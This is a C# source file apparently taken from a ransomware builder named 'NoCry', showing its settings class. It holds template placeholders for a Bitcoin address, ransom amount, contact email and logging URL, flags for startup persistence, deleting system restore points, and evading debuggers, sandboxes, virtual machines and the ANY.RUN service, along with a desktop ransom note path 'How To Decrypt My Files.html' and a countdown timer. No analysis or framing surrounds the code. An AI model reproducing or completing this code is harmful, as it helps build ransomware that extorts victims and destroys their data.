using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NoCry;

[StandardModule]
internal sealed class St
{
	public static string hash;

	public static string startup = "%startup%";

	public static string DeleteRestorePoints = "%RestorePoints%";

	public static string mute = "%mute%";

	public static string exs = "%exst%";

	public static string html = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\How To Decrypt My Files.html";

	public static string btc = "%address%";

	public static string email = "%email%";

	public static string amount = "%Am%";

	public static string logg = "%urlll%";

	public static string Emulator = "%Emulator%";

	public static string DetectDebugger = "%DetectDebugger%";

	public static string DetectSandboxie = "%DetectSandboxie%";

	public static string DetectVirtualMachine = "%DetectVirtualMachine%";

	public static string anyrun = "%anyrun%";

	public static string Setting = "Runcount.cry";

	public static int H = Conversions.ToInteger("%H%");

	public static int m = Conversions.ToInteger("%M%");

	public static object Del = Interaction.GetSetting("D", "0", Setting, "");

	public static string Attempts = "%Attempts%";

	public static int maxrandom = 6;

	public static string validchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
}
